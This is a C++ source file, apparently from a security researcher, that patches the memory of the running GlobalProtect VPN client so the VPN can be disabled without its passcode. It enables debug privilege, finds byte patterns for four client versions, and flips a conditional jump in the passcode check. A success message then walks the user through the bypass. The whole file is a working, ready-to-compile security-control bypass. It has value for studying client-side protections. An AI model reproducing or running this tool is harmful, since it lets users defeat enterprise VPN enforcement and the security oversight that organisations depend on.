/*
 * Global Protect VPN Application patcher allowing the 
 * Administrator user to disable VPN without Passcode.
 *
 * It does this by patching process memory and thus allowing to 
 * disable VPN without entering proper password.
 * 
 * Tested on Palo Alto Networks: 
 *  GlobalProtect client 3.1.6.19 (x64)
 *  GlobalProtect client 5.0.3.29 (x64)
 *  GlobalProtect client 5.1.3.12 (x64)
 *  GlobalProtect client 5.2.8.23 (x64)
 *
 * Compilation:
 *   C:> g++ GlobalProtectDisable.cpp -o GlobalProtectDisable.exe -static -static-libgcc -static-libstdc++
 *
 * Mariusz Banach / mgeeky, '18-'20
**/

#include "windows.h"
#include <iostream>
#include <sstream>
#include <tlhelp32.h>

using namespace std;

const size_t PatternsNum = 4;

const wchar_t *versionsArray[PatternsNum] = {
    L"3.1.6.19",
    L"5.0.3.29",
    L"5.1.3.12",
    L"5.2.8.23",
};

//
// Patterns defined below must end up just before bytes intended to be replaced,
// so just before JNE opcodes (75 XY)
//

/*
00007FF621B7D02A | 85 C0                              | test    eax, eax                              |
00007FF621B7D02C | 78 61                              | js      pangpa.7FF621B7D08F                   |
00007FF621B7D02E | 48 8B CB                           | mov     rcx, rbx                              |
00007FF621B7D031 | E8 7A 00 00 00                     | call    pangpa.7FF621B7D0B0                   |
00007FF621B7D036 | 85 C0                              | test    eax, eax                              |
00007FF621B7D038 | 75 55                              | jne     pangpa.7FF621B7D08F 
                    ^--- This is byte to be patched. ----^
*/
const BYTE patternToFind31619[] = {
    0x85, 0xC0, 0x78, 0x61, 0x48, 0x8B, 0xCB, 0xE8, 
    0x7A, 0x00, 0x00, 0x00, 0x85, 0xC0
};

/*
.text:000000014005BFCC 48 83 C1 78                          add     rcx, 78h ; 'x'
.text:000000014005BFD0 FF 15 BA B3 04 00                    call    cs:CRichEditView::XRichEditOleCallback::ContextSensitiveHelp(int)
.text:000000014005BFD6 85 C0                                test    eax, eax
.text:000000014005BFD8 75 49                                jnz     short loc_14005C023
                        ^--- This is byte to be patched. ----^
.text:000000014005BFDA 83 3D B3 94 0A 00 05                 cmp     cs:dword_140105494, 5

Look for strings such as:
    "CDisableDialog::CheckPasscode - passcode matched, ok to disable"
    "CDisableDialog::CheckPasscode - passcode mismatch, deny disabling"
*/
const BYTE patternToFind50329[] = {
    0x48, 0x83, 0xc1, 0x78, 0xff, 0x15, 0xba, 0xb3, 0x04, 0x00,
    0x85, 0xc0
};


/*
.text:000000014009E654 4C 89 B4 24 88 00 00 00                 mov     [rsp+0A8h+var_20], r14
.text:000000014009E65C 4C 89 BC 24 80 00 00 00                 mov     [rsp+0A8h+var_28], r15
.text:000000014009E664 85 D2                                   test    edx, edx
.text:000000014009E666 0F 85 8C 00 00 00                       jnz     loc_14009E6F8
                        ^--- This is byte to be patched. -------^
.text:000000014009E66C 83 3D 41 E4 34 00 05                    cmp     cs:dword_1403ECAB4, 5
.text:000000014009E673 72 78                                   jb      short loc_14009E6ED
.text:000000014009E675 48 8D 4C 24 60                          lea     rcx, [rsp+0A8h+SystemTime] ; lpSystemTime
*/
const BYTE patternToFind51312[] = {
    0x24, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xBC, 0x24, 0x80, 
    0x00, 0x00, 0x00, 0x85, 0xD2
};

const wchar_t *processName = L"PanGPA.exe";
const size_t SizeOfReplacingBytes = 2;

// jne     pangpa.7FF621B7D08F
const BYTE bytesToBeReplaced31619[SizeOfReplacingBytes] = {
    0x75, 0x55
};

// je      pangpa.7FF621B7D08F
const BYTE replacingBytes31619[SizeOfReplacingBytes] = {
    0x74, 0x55
};

// jnz     short loc_14005C023
const BYTE bytesToBeReplaced50329[SizeOfReplacingBytes] = {
    0x75, 0x49
};

// jz      short loc_14005C023
const BYTE replacingBytes50329[SizeOfReplacingBytes] = {
    0x74, 0x49
};

// jnz     loc_14009E6F8
const BYTE bytesToBeReplaced51312[SizeOfReplacingBytes] = {
    0x0F, 0x85
};

// jz     loc_14009E6F8
const BYTE replacingBytes51312[SizeOfReplacingBytes] = {
    0x0F, 0x84
};


const BYTE *patternsArray[PatternsNum] = {
    patternToFind31619,
    patternToFind50329,
    patternToFind51312,
    patternToFind51312
};

const size_t patternsSizes[PatternsNum] = {
    sizeof(patternToFind31619),
    sizeof(patternToFind50329),
    sizeof(patternToFind51312),
    sizeof(patternToFind51312)
};

const BYTE *patternsToBeReplaced[PatternsNum] = {
    bytesToBeReplaced31619,
    bytesToBeReplaced50329,
    bytesToBeReplaced51312,
    bytesToBeReplaced51312
};

const BYTE *replacingBytes[PatternsNum] = {
    replacingBytes31619,
    replacingBytes50329,
    replacingBytes51312,
    replacingBytes51312
};


struct moduleInfo {
    UINT64 baseAddr;
    DWORD baseSize;
};

bool alreadyPatched = false;


void dbg(const wchar_t * format, ...) {
    wchar_t buffer[4096];
    va_list args;
    va_start (args, format);
    vswprintf (buffer,format, args);

    wcout << L"[dbg] " << buffer << endl;
    va_end (args);
}

void msg(const wchar_t * format, ...) {
    wchar_t buffer[4096];
    va_list args;
    va_start (args, format);
    vswprintf (buffer,format, args);

    MessageBoxW(NULL, buffer, L"GlobalProtectDisable", 0);
    va_end (args);
}

BOOL setPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
){
  
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if ( !LookupPrivilegeValue( 
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid ) )        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.
    if ( !AdjustTokenPrivileges(
           hToken, 
           FALSE, 
           &tp, 
           sizeof(TOKEN_PRIVILEGES), 
           (PTOKEN_PRIVILEGES) NULL, 
           (PDWORD) NULL) ){ 
        printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
        return FALSE; 
    } 

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED){
          printf("The token does not have the specified privilege. \n");
          return FALSE;
    } 

    return TRUE;
}

DWORD findProcess(const wchar_t *procname) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        if(Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (wcsicmp(procname, pe32.szExeFile) == 0) {
                    return pe32.th32ProcessID;
                }
            } while(Process32NextW(hSnapshot, &pe32));
         }
         CloseHandle(hSnapshot);
    }

    return 0;
}

BOOL getProcessModule(
    const wchar_t * modName, 
    DWORD pid, 
    struct moduleInfo *out
) {
    dbg(L"PID = %d", pid);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    
    if(hSnapshot != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W me32;
        me32.dwSize = sizeof(MODULEENTRY32W);

        if(Module32FirstW(hSnapshot, &me32)) {
            do {
                dbg(L"Module name: %ls", me32.szModule);

                if (wcsicmp(modName, me32.szModule) == 0) {
                    memset(out, 0, sizeof(struct moduleInfo));

                    out->baseAddr = (UINT64)me32.modBaseAddr;
                    out->baseSize = me32.modBaseSize;

                    return true;
                }
            } while(Module32NextW(hSnapshot, &me32));
         }
         else {
            dbg(L"Module32FirstW failed.");
         }

         CloseHandle(hSnapshot);
    }
    else {
        dbg(L"CreateToolhelp32Snapshot failed.");
    }

    return false;
}

BOOL patchProcessMemory(
    struct moduleInfo &mod,
    DWORD pid,
    HANDLE hProcess,
    const BYTE * patternToFind,
    size_t patternToFindNum,
    const BYTE * bytesToBeReplaced,
    size_t bytesToBeReplacedNum,
    const BYTE * replacingBytes,
    size_t replacingBytesNum
) {
    dbg(L"Module base: %llx, module size: %d", mod.baseAddr, mod.baseSize);

    BYTE page[4096];

    SIZE_T fetched = 0;
    UINT64 addr = mod.baseAddr;

    while( fetched < mod.baseSize) {
        memset(page, 0, sizeof(page));

        SIZE_T out = 0;

        if(ReadProcessMemory(
            hProcess,
            reinterpret_cast<LPCVOID>(addr),
            page,
            sizeof(page),
            &out
        )) {

            UINT64 foundAddr = 0;

            for(size_t m = 0; m < sizeof(page); m++) {
                if (page[m] == patternToFind[0]) {
                    bool found = true;
                    for(size_t n = 0; n < patternToFindNum; n++) {
                        if(page[m + n] != patternToFind[n]) {
                            found = false;
                            break;
                        }
                    }

                    if(found) {
                        dbg(L"Found pattern at: %016llx: %x, %x, %x, %x, %x, %x, %x, %x, ...",
                            addr + m,
                            page[m + 0],
                            page[m + 1],
                            page[m + 2],
                            page[m + 3],
                            page[m + 4],
                            page[m + 5],
                            page[m + 6],
                            page[m + 7]
                        );

                        for(size_t n = 0; n < bytesToBeReplacedNum; n++) {
                            if(page[m + patternToFindNum + n] != bytesToBeReplaced[n]) {
                                found = false;

                                if ( page[m + patternToFindNum + n] == replacingBytes[n]) {
                                    msg(L"Process is already patched.\nNo need to do it again.");
                                    alreadyPatched = true;
                                    return false;
                                }

                                dbg(L"Assuring pattern failed at byte %d: %x -> %x",
                                    n, page[m + patternToFindNum + n], bytesToBeReplaced[n] );
                                break;
                            }
                        }

                        if(found) {
                            foundAddr = addr + m + patternToFindNum;
                            dbg(L"Found pattern at: 0x%llx", foundAddr);
                            break;
                        }
                    }
                }
            }

            if (foundAddr) {
                dbg(L"Starting patching process from address: %016llx", foundAddr);
                out = 0;

                if(WriteProcessMemory(
                    hProcess,
                    reinterpret_cast<LPVOID>(foundAddr),
                    replacingBytes,
                    replacingBytesNum,
                    &out
                )) {
                    dbg(L"Process has been patched, written: %d bytes.", out);
                    return true;
                }

                dbg(L"Process patching failed.");
                return false;
            }

            fetched += out;
            addr += out;
        }
    }

    return false;
}

int CALLBACK WinMain(
  HINSTANCE hInstance,
  HINSTANCE hPrevInstance,
  LPSTR     lpCmdLine,
  int       nCmdShow
) {

    HANDLE hToken = NULL;

    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)){
        msg(L"OpenProcessToken() failed, error %u\n", GetLastError());
        return 0;
    }

    if(!setPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        msg(L"Failed to enable privilege, error %u\n", GetLastError());
        return 0;
    }

    DWORD pid = findProcess(processName);
    if (!pid) {
        msg(L"Could not find GlobalProtect process.");
        return 0;
    }

    dbg(L"Found PanGPA process: %d", pid);
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        msg(L"Could not open GlobalProtect process. Error: %d", GetLastError());
        return 0;
    }

    dbg(L"Opened process handle.");

    BOOL ret;

    struct moduleInfo mod = {0};
    if (!getProcessModule(processName, pid, &mod)) {
        dbg(L"Could not find process module. Error: %d", GetLastError());
        return false;
    }

    size_t i = 0;
    for(i = 0; i < PatternsNum; i++)
    {
        dbg(L"Trying to match pattern for version: %ls", versionsArray[i]);

        ret = patchProcessMemory(
            mod,
            pid,
            hProcess,
            patternsArray[i],
            patternsSizes[i],
            patternsToBeReplaced[i],
            SizeOfReplacingBytes,
            replacingBytes[i],
            SizeOfReplacingBytes
        );

        if(ret) break;
    }

    if(!ret) {
        if(!alreadyPatched) {
            msg(L"Could not patch the process. Error: %d", GetLastError());
        }
    }
    else {
        msg(L"Successfully patched the process (version: %ls)! :-)\nNow, in order to bypass GlobalProtect - do the following:\n\t1. Right click on GlobalProtect Tray-icon\n\t2. Select 'Disable'\n\t3. In 'Passcode' input field enter whatever you like.\n\t4. Press OK.\n\nThe GlobalProtect should disable itself cleanly.\n\nHave fun!", versionsArray[i]);
    }

    dbg(L"Closing process handle.");
    CloseHandle(hProcess);
    return 0;
}